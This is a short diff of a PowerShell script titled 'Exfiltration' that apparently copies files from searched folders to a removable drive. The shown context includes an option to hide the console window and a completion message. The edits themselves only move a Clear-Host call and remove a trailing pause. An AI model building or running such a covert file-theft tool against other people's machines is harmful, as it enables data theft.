@@ -12,9 +12,9 @@ USAGE
 #>
 
 [Console]::BackgroundColor = "Black"
-Clear-Host
 [Console]::SetWindowSize(78, 30)
 [Console]::Title = "Exfiltration"
+Clear-Host
 
 $hidden = Read-Host "Would you like to hide this console window? (Y/N)"
 $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
@@ -66,4 +66,4 @@ foreach ($folder in $foldersToSearch) {
         Write-Host "File Exfiltration Complete"
     }
 
-pause
+
